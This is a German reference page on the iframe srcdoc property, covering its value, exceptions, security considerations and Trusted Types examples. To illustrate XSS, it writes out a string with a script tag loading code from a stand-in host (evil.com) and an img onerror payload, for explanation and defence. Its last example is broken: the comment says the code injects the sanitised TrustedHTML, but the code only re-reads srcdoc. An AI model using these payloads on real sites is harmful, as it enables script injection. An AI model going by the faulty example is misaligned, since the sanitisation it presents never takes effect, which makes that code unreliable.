---
title: "HTMLIFrameElement: srcdoc-Eigenschaft"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
l10n:
  sourceCommit: aff319cd81d10cfda31b13adb3263deafb284b20
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Diese Eigenschaft analysiert ihren Eingabewert als HTML und schreibt das Ergebnis in das DOM des Frames.
> APIs dieser Art sind bekannt als [Injection-Sinks](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) und können eine potenzielle Angriffsfläche für [Cross-Site Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS) darstellen, wenn die Eingabe ursprünglich von einem Angreifer stammt.
>
> Sie können dieses Risiko mindern, indem Sie stets `TrustedHTML`-Objekte anstelle von Strings zuweisen und [Trusted Types durchsetzen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> Weitere Informationen finden Sie unter [Sicherheitsüberlegungen](#sicherheitsüberlegungen).

Die **`srcdoc`**-Eigenschaft des [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement)-Interfaces ruft den inline HTML-Code des Dokuments des Frames ab oder setzt ihn.

Dies spiegelt das [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attribut des {{htmlelement("iframe")}} wider.

## Wert

Das Abrufen der Eigenschaft liefert einen String, der die HTML-Serialisierung des Dokuments des Frames enthält.
Wenn der Wert nicht gesetzt ist, ist er `undefined`.

Das Setzen der Eigenschaft akzeptiert entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder einen String.
Es analysiert diese Eingabe als HTML-Dokument und ersetzt den Inhalt des Frames mit dem Ergebnis.

### Ausnahmen

- `TypeError`
  - : Wird ausgelöst, wenn die Eigenschaft auf einen String gesetzt wird, während [Trusted Types](/de/docs/Web/API/Trusted_Types_API) [durch eine CSP durchgesetzt werden](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) und keine Standardrichtlinie definiert ist.

## Beschreibung

Die **`srcdoc`**-Eigenschaft spiegelt den Inhalt des `<iframe>`-Elements [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc)-Attributs wider und kann verwendet werden, um das HTML-Dokument, das zum {{htmlelement("iframe")}} gehört, zu setzen oder abzurufen.

Beim Setzen der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument definieren, einschließlich der {{Glossary("doctype", "Doctype-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und anderer Tags.
Beachten Sie jedoch, dass Browser in der Regel tolerant gegenüber ungültigem Markup sind und die meisten versuchen sollten, Eingaben zu rendern, die nur Body-Inhalte enthalten.

Jegliches vom Browser unterstützte Markup wird analysiert/serialisiert, einschließlich {{Glossary("shadow_tree", "Shadow Roots")}}.

Beachten Sie, dass wenn dies festgelegt ist, es jeden in der [`src`](/de/docs/Web/API/HTMLIFrameElement/src)-Eigenschaft festgelegten Wert überschreibt.

### Sicherheitsüberlegungen

Die `srcdoc`-Eigenschaft erlaubt standardmäßig jeglichen HTML-Code, der in einem Frame ausgeführt wird.
Wenn der Frame nicht mit der Content Security Policy (CSP) [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) sandboxed ist (oder sandboxed ist, aber den [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin)-Wert einschließt), dann ist er mit dem Elternteil gleichwertig (same-origin).
Das bedeutet, dass der Frame vollständigen Zugriff auf das DOM und die Ressourcen des Elternteils hat, und umgekehrt.

Dies ist ein signifikanter Vektor für [Cross-Site Scripting (XSS)](/de/docs/Web/Security/Attacks/XSS)-Angriffe, wenn potenziell unsichere Strings eines Benutzers in einen Frame injiziert werden, ohne zuvor bereinigt zu werden.
Betrachten Sie den folgenden Code, bei dem ein HTML-String von einem Benutzer in einen Frame übergeben wird, der dann dem Dokument hinzugefügt wird.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Wenn der Frame nicht den Zugriff auf Ihr Eltern-Dokument benötigt, können Sie das Risiko mindern, indem Sie eine CSP-Sandbox ohne den `allow-same-origin`-Wert verwenden.
Der Frame wird dann als eine Ressource einer anderen Herkunft behandelt, und Angriffe werden signifikant eingeschränkt.
Sie können auch eine allgemeinere CSP verwenden, um die Orte zu beschränken, von denen Skripte und andere Ressourcen abgerufen werden dürfen.

Sie können das Risiko weiter reduzieren, indem Sie stets [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekte anstelle von Strings zuweisen und [Trusted Types durchsetzen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) mit der [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for)-CSP-Direktive.
Dies stellt sicher, dass die Eingabe durch eine Transformationsfunktion geleitet wird, die die Möglichkeit hat, die Eingabe zu [bereinigen](/de/docs/Web/Security/Attacks/XSS#sanitization), um potenziell gefährliches Markup zu entfernen, bevor es injiziert wird.

## Beispiele

### Lesen des HTML von einem iframe

Das Lesen von `srcdoc` veranlasst den User-Agent dazu, das Dokument des iframes zu serialisieren.

Angesichts des folgenden HTML:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
```

Können Sie das Markup wie folgt abrufen und protokollieren:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Ersetzen der Frame-Inline-Quelle

In diesem Beispiel werden wir das Dokument eines Frames ersetzen, indem wir HTML seiner `srcdoc`-Eigenschaft zuweisen.
Um das XSS-Risiko zu mindern, erstellen wir zuerst ein `TrustedHTML`-Objekt aus dem String, der das HTML enthält, und weisen dieses Objekt dann `srcdoc` zu.

Trusted Types werden noch nicht von allen Browsern unterstützt, daher definieren wir zuerst das [trusted types tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
Dies fungiert als transparenter Ersatz für die Trusted Types JavaScript API:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Als Nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die eine [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML) definiert, um einen Eingabestring in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen zu transformieren.
Häufig verwenden Implementierungen von `createHTML()` eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify), um die Eingabe zu bereinigen, wie unten gezeigt:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Dann verwenden wir dieses `policy`-Objekt, um ein `TrustedHTML`-Objekt aus dem potenziell unsicheren Eingabestring zu erstellen und das Ergebnis dem Element zuzuweisen:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Obwohl Sie direkt einen String `srcdoc` zuweisen können, stellt dies ein [Sicherheitsrisiko](#sicherheitsüberlegungen) dar, wenn der einzufügende String potenziell bösartige Inhalte enthalten könnte.
> Sie sollten `TrustedHTML` verwenden, um sicherzustellen, dass der Inhalt bereinigt wird, bevor er eingefügt wird, und Sie sollten einen CSP-Header setzen, um [Trusted Types durchzusetzen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}
